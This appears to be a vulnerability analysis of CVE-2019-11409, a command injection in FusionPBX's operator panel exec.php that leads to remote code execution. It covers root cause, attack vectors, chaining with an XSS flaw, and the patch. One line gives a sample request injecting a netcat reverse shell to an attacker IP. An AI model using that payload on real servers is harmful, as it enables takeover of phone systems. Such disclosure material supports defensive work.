Based on the provided content, here's the analysis of CVE-2019-11409:

**Root cause of vulnerability:**

- The `exec.php` component of the FusionPBX operator panel module is vulnerable to API command injection. The `cmd` parameter from a GET request is directly used to construct a command that is sent to the FreeSWITCH event socket interface.

**Weaknesses/vulnerabilities present:**

-   **Command injection:** The application fails to properly sanitize user input (`cmd` parameter) before using it to construct a command for the FreeSWITCH event socket. While some sanitization is attempted, it is insufficient to prevent command injection.
-   **Lack of CSRF protection:** The vulnerability can be exploited through CSRF attacks, by targeting authenticated users with malicious HTML payloads.
-   **Insufficient input validation:** The `switch_cmd` parameter is not sufficiently validated, allowing arbitrary commands to be executed via the FreeSWITCH "system" command.

**Impact of exploitation:**

-   **Remote code execution (RCE):** An attacker can execute arbitrary shell commands on the server running FusionPBX by injecting a malicious command into the `cmd` parameter. This is possible through the FreeSWITCH `system` command.
-   **Full system compromise:** Successful exploitation can lead to full system compromise, allowing the attacker to gain control of the server.

**Attack vectors:**

-   **Direct HTTP request:** An attacker can send a crafted HTTP GET request to `exec.php` with a malicious `cmd` parameter.
-  **CSRF:** An attacker can target an authenticated user with a crafted HTML payload.
-   **Chaining with XSS:** The command injection vulnerability can be chained with an XSS vulnerability (CVE-2019-11408) to achieve unauthenticated RCE.

**Required attacker capabilities/position:**

-   The attacker needs to be able to send HTTP requests to the FusionPBX server.
-   For direct exploitation, the attacker needs to know the URL to the `exec.php` file, and be able to send a `cmd` parameter with a malicious command.
-   For CSRF attacks, the attacker needs to be able to trick an authenticated user into clicking on a malicious link.
-   If chained with CVE-2019-11408, an attacker can gain unauthenticated RCE by making a call to the system with a malicious caller ID, which then triggers the XSS, which in turn exploits the command injection vulnerability.
-   Authentication is required for direct exploitation, though not necessarily admin privileges.

**Additional details:**

-   The vulnerability can be exploited by sending a request similar to: `https://victim-pbx1.example.com/app/operator_panel/exec.php?cmd=system%20nc%20-e%20/bin/bash%10.10.10.10%204444`
-   The exploit code provided in the blog post demonstrates how to chain this with the XSS vulnerability (CVE-2019-11408) to achieve unauthenticated RCE by using a crafted SIP INVITE packet containing the XSS payload in the `From` field and injecting shell command via the `cmd` parameter.

**Patch Information:**
- A patch was created in commit `cea3e5cd24d9c6ecb9a25f7c874d5193d0fcf5a3` and merged in pull request #4170.
